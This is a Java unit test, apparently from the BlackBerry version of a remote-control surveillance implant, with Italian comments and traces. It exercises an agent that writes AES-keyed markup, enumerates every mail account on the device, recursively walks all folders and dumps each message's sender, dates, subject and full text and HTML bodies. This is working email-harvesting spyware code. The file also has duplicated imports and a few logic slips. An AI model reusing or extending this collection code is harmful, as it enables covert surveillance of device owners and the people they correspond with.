package com.ht.tests.unit;

import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.log.Markup;
import com.ht.rcs.blackberry.utils.Utils;
import com.ht.tests.AssertException;
import com.ht.tests.TestUnit;
import com.ht.tests.Tests;

import com.ht.tests.AssertException;
import com.ht.tests.TestUnit;
import com.ht.tests.Tests;
import net.rim.device.api.servicebook.ServiceBook; //import net.rim.device.api.ui.component.Dialog;

import net.rim.device.api.util.IntHashtable;
import net.rim.device.api.servicebook.ServiceRecord;

import java.io.IOException;
import java.util.Date;
import java.util.Vector;
import net.rim.blackberry.api.mail.*; //import java.util.Date;
import net.rim.device.api.io.http.HttpDateParser;
import net.rim.device.api.ui.*;

public class UT_IMAgent extends TestUnit {
	protected final static int BODY = 1;
	protected final static boolean FILTERFROM = false;
	protected final static boolean FILTERTO = false;
	protected final static String DATEFROM = "Tue, Mar 23 2010 06:31:27 GMT";
	protected final static String DATETO = "Tue, Apr 01 2010 22:31:27 GMT";
	protected static IntHashtable _fieldTable;
	private static boolean _editable;
	protected static Store _store;
	private static ServiceRecord[] _mailServiceRecords;

	public UT_IMAgent(String name, Tests tests) {
		super(name, tests);
	}

	public boolean run() throws AssertException {

		debug.info("Eccomi!");
		
		// serializzi la data date
		Date date = new Date();
		long timestamp = date.getTime();
		byte[] serialize = Utils.longToByteArray(timestamp);
		
		Markup markup = new Markup(Agent.AGENT_IM, Keys.getInstance().getAesKey());
		markup.writeMarkup(serialize);
		
		// deserializzi in readddate
		byte[] deserialized;
        try {
	        deserialized = markup.readMarkup();
	        long timeread = Utils.byteArrayToLong(deserialized, 0);
			Date readdate = new Date(timeread);
        } catch (IOException e) {
	        // TODO Auto-generated catch block
	        e.printStackTrace();
        }
		

		debug.trace("Cominciamo a spulciare gli account di posta...");

		ServiceBook serviceBook = ServiceBook.getSB();
		_mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
		String[] names = new String[_mailServiceRecords.length];

		debug.trace("Ci sono: " + _mailServiceRecords.length
		        + " account di posta!");

		// Controllo tutti gli account di posta
		for (int count = _mailServiceRecords.length - 1; count >= 0; --count) {
			names[count] = _mailServiceRecords[count].getName();
			debug.trace("Nome dell'account di posta: " + names[count]);

			names[count] = _mailServiceRecords[0].getName();
			ServiceConfiguration sc = new ServiceConfiguration(
			        _mailServiceRecords[count]);
			_store = Session.getInstance(sc).getStore();

			Folder[] folders = _store.list();
			// Scandisco ogni Folder dell'account di posta
			scanFolder(folders);
		}
		debug.trace("Fine ricerca!!");
		return true;

	}

	public static void scanFolder(Folder[] subfolders) {
		Folder[] dirs;
		long dataArrivo, filterDate;
		// Date emailDate;
		boolean printEmail;

		// Date receivedDate;
		if (subfolders.length > 0) {
			for (int count = 0; count < subfolders.length; count++) {
				debug.trace("Nome della cartella: "
				        + subfolders[count].getFullName());
				dirs = subfolders[count].list();
				scanFolder(dirs);
				try {
					Message[] messages = subfolders[count].getMessages();
					// Scandisco ogni e-mail dell'account di posta
					for (int j = 0; j < messages.length; j++) {
						Message message = messages[j];

						printEmail = false;

						debug.trace("Data di invio dell'email "
						        + message.getSentDate() + " long: "
						        + message.getSentDate().getTime());
						debug.trace("Data di arrivo dell'email "
						        + message.getReceivedDate() + " long: "
						        + message.getReceivedDate().getTime());
						debug.trace("Data del filtro FROM " + DATEFROM
						        + " long: " + HttpDateParser.parse(DATEFROM));
						debug.trace("Data del filtro TO " + DATETO
						        + " long: " + HttpDateParser.parse(DATETO));

						if (FILTERFROM == true) // Se c'e' un filtro sulla data
						// entro
						{
							dataArrivo = message.getReceivedDate().getTime();
							filterDate = HttpDateParser.parse(DATEFROM);
							if (dataArrivo >= filterDate) // Se la data
							// dell'email e'
							// successiva a quella
							// del filtro
							{
								if (FILTERTO == true) // Se c'e' anche il filtro
								// della data di fine
								{
									filterDate = HttpDateParser.parse(DATETO);
									if (dataArrivo <= filterDate) // Se la data
									// dell'email
									// e' tra data
									// di inizio e
									// data di
									// fine => OK
									{
										debug.trace("Sono attivi i 2 filtri e l'email rispetta i 2 criteri FROM e TO");
										printEmail = true;
									}
								} else {
									debug.trace("E' attivo solo il filtro FROM e l'email rispetta questo criterio");
									printEmail = true; // Se la data dell'email
									// e' corretta, e c'e'
									// solo il primo filtro
									// ma non il secondo =>
									// OK
								}
							}

						} else {
							debug.trace("Non sono attivi criteri quindi l'email viene acquisita");
							printEmail = true; // Se non ci sono filtri
						}

						if (printEmail == true) {
							debug.trace("-------------------------------- e-mail numero "
							                + j
							                + " ---------------------------------");
							debug.trace("Mittente dell'email: "
							        + message.getFrom());
							debug.trace("Dimensione dell'email: "
							        + message.getSize() + "bytes");
							debug.trace("Data invio dell'email: "
							        + message.getSentDate());
							debug.trace("Oggetto dell'email: "
							        + message.getSubject());
							// Date dataArrivo = message.getReceivedDate();
							// Date dataArrivo = message.getSentDate();
							// Date expirationDate = new
							// Date(HttpDateParser.parse(dataArrivo.toString()));
							// System.out.println("Data di arrivo dell'email long: "
							// + expirationDate.getTime());
							debug.trace("Data di invio dell'email long: "
							                + message.getSentDate().getTime());
							debug.trace("Data di arrivo dell'email long: "
							                + message.getReceivedDate()
							                        .getTime());
							// Date data = new Date();
							// long timeArrived;
							// timeArrived = data.getTime();

							Object obj = message.getContent();

							Multipart parent = null;
							if (obj instanceof MimeBodyPart
							        || obj instanceof TextBodyPart) {
								BodyPart bp = (BodyPart) obj;
								parent = bp.getParent();
							} else {
								parent = (Multipart) obj;
							}

							// Display the message body
							String mpType = parent.getContentType();
							if (mpType
							        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
							        || mpType
							                .equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
								displayMultipart(parent);
							}
							System.out
							        .println("-------------------------------------------------------------------------------------");
						}
					}
				} catch (MessagingException e) {
					debug.trace("Folder#getMessages() threw "
					        + e.toString());

				}
			}
		}
	}

	protected static void displayMultipart(Multipart multipart) {
		// This vector stores fields which are to be displayed only after all
		// of the body fields are displayed. (Attachments and Contacts).
		Vector delayedFields = new Vector();

		// Process each part of the multi-part, taking the appropriate action
		// depending on the part's type. This loop should: display text and
		// html body parts, recursively display multi-parts and store
		// attachments and contacts to display later.
		for (int index = 0; index < multipart.getCount(); index++) {
			BodyPart bodyPart = multipart.getBodyPart(index);

			// If this body part is text then display all of it
			if (bodyPart instanceof TextBodyPart) {
				TextBodyPart textBodyPart = (TextBodyPart) bodyPart;

				// If there are missing parts of the text, try to retrieve the
				// rest of it.
				if (textBodyPart.hasMore()) {
					try {
						Transport.more(textBodyPart, true);
					} catch (Exception e) {
						debug.trace("Transport.more(BodyPart, boolean) threw "
						                + e.toString());
					}
				}
				String plainText = (String) textBodyPart.getContent();

				// Display the plain text, using an EditField if the message is
				// editable or a RichTextField if it is not editable. Note: this
				// does not add any empty fields.
				if (plainText.length() != 0) {
					debug.trace("Testo dell'email :" + plainText);
				}
			} else if (bodyPart instanceof MimeBodyPart) {
				MimeBodyPart mimeBodyPart = (MimeBodyPart) bodyPart;

				// If the content is text then display it
				String contentType = mimeBodyPart.getContentType();
				if (contentType
				        .startsWith(BodyPart.ContentType.TYPE_TEXT_HTML_STRING)) {
					Object obj = mimeBodyPart.getContent();
					if (obj != null) {
						String htmlText = new String((byte[]) obj);
						debug.trace("Testo dell'email MIME: " + htmlText);
					}
				} else if (contentType
				        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
					// If the body part is a multi-part and it has the the
					// content type of TYPE_MULTIPART_ALTERNATIVE_STRING, then
					// recursively display the multi-part.
					Object obj = mimeBodyPart.getContent();
					if (obj instanceof Multipart) {
						Multipart childMultipart = (Multipart) obj;
						String childMultipartType = childMultipart
						        .getContentType();
						if (childMultipartType
						        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
							displayMultipart(childMultipart);
						}
					}
				}
			}

		}

		// Now that the body parts have been displayed, display the queued
		// fields while separating them by inserting a separator field.
		for (int index = 0; index < delayedFields.size(); index++) {
			//System.out.println(delayedFields.elementAt(index));
			debug.trace(delayedFields.elementAt(index).toString());
		}
	}

}
